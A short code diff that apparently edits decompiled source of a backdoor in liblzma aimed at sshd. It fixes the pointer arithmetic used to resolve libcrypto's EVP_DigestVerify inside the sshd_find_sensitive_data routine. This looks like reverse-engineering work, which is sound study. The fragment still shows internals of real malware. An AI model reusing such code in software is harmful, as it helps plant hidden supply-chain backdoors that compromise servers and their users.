@@ -124,7 +124,7 @@ BOOL sshd_find_sensitive_data
     digest_verify_addr = digest_verify_sym->st_value;
     libcrypto_header = libcrypto->elfbase;
     funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
-    funcs->EVP_DigestVerify = (pfn_EVP_DigestVerify_t)(libcrypto_header->e_ident + digest_verify_addr);
+    funcs->EVP_DigestVerify = (pfn_EVP_DigestVerify_t)((u8 *)libcrypto_header + digest_verify_addr);
   }
   cipher_ctx_new = (pfn_EVP_CIPHER_CTX_new_t)lzma_alloc(0x838,allocator);
   funcs->EVP_CIPHER_CTX_new = cipher_ctx_new;
